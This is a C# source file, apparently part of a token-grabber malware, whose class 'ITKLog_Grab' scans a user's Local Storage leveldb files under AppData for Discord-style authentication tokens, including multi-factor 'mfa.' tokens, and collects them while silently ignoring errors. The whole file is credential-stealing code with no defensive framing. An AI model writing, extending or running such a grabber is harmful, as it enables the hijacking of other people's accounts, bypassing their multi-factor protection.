using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

public static class ITKLog_Grab
{
    public static bool TokensFound { get; private set; }

    public static List<string> GetTokens(string dir)
    {
        var leveldb = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) +
                                        @"\AppData\" + dir + @"\Local Storage\leveldb");

        var tokens = new List<string>();

        try
        {
            // LDB
            foreach (var file in leveldb.GetFiles("*.ldb"))
            {
                var contents = file.OpenText().ReadToEnd();
                //Get normal tokens
                foreach (Match match in Regex.Matches(contents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                    tokens.Add(match.Value);

                //Get tokens where multi factor authentication is enabled
                foreach (Match match in Regex.Matches(contents, @"mfa\.[\w-]{84}"))
                    tokens.Add(match.Value);
            }

            // LOG
            foreach (var file in leveldb.GetFiles("*.log"))
            {
                var contents = file.OpenText().ReadToEnd();
                //Get normal tokens
                foreach (Match match in Regex.Matches(contents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                    tokens.Add(match.Value);

                //Get tokens where multi factor authentication is enabled
                foreach (Match match in Regex.Matches(contents, @"mfa\.[\w-]{84}"))
                    tokens.Add(match.Value);
            }
        }
        catch
        {
            // ignored
        }

        tokens = tokens.Distinct().ToList();

        if (tokens.Count <= 0) return tokens;
        TokensFound = true;
        tokens[tokens.Count - 1] += " - Latest";

        return tokens;
    }
}